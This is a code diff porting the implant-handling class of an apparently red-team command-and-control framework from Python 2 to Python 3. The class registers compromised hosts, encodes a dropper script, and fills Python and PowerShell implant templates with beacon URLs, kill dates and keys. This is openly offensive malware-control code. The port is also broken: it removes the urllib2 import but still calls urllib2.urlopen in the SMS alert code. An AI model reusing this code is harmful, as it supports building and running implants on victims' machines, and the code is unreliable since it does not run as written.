@@ -6,8 +6,10 @@ from Config import PayloadsDirectory, FilesDirectory, Jitter, EnableNotification
 from DB import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns
 from Core import get_images
 from AutoLoads import run_autoloads
+from urllib.request import urlopen
+from urllib.parse import urlencode
 
-import urllib2, base64, datetime
+import base64, datetime
 
 class Implant(object):
 
@@ -17,7 +19,7 @@ class Implant(object):
     self.User = user
     self.Hostname = hostname
     self.IPAddress = ipaddress
-    self.Key = gen_key()
+    self.Key = gen_key().decode("utf-8")
     self.FirstSeen = (datetime.datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
     self.LastSeen = (datetime.datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
     self.PID = pid
@@ -45,19 +47,18 @@ JITTER2025%s5202RETTIJ
 NEWKEY8839394%s4939388YEKWEN
 IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Jitter, self.Key, self.AllBeaconImages)
     with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
-        self.PythonImplant = base64.b64encode(f.read())
+        self.PythonImplant = base64.b64encode(f.read()).decode("utf-8")
     py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
     self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
     ps_implant_core = open("%s/Implant-Core.ps1" % FilesDirectory, 'r').read()
     self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs) #Add all db elements def display(self):
-
   #Add all db elements
   def display(self):
-    print Colours.GREEN,""
+    print (Colours.GREEN,"")
     it = self.Pivot
-    print "[%s] New %s implant connected: (uri=%s key=%s)" % (self.ImplantID, it, self.RandomURI, self.Key)
-    print "%s | Time:%s | PID:%s | Sleep:%s | %s (%s) | URL:%s" % (self.IPAddress, self.FirstSeen, self.PID, self.Sleep, (self.User+" @ "+self.Hostname), self.Arch, self.Proxy)
-    print "",Colours.END
+    print ("[%s] New %s implant connected: (uri=%s key=%s)" % (self.ImplantID, it, self.RandomURI, self.Key))
+    print ("%s | Time:%s | PID:%s | Sleep:%s | %s (%s) | URL:%s" % (self.IPAddress, self.FirstSeen, str(self.PID), str(self.Sleep), (str(self.User)+" @ "+str(self.Hostname)), self.Arch, self.Proxy))
+    print ("",Colours.END)
 
     try:
       if Sounds.lower().strip() == "yes":
@@ -91,7 +92,7 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
           url = url.replace(" ","+")
           urllib2.urlopen(url)
     except Exception as e:
-      print "SMS send error: %s" % e
+      print ("SMS send error: %s" % e)
       
   def save(self):
     self.ImplantID = new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)
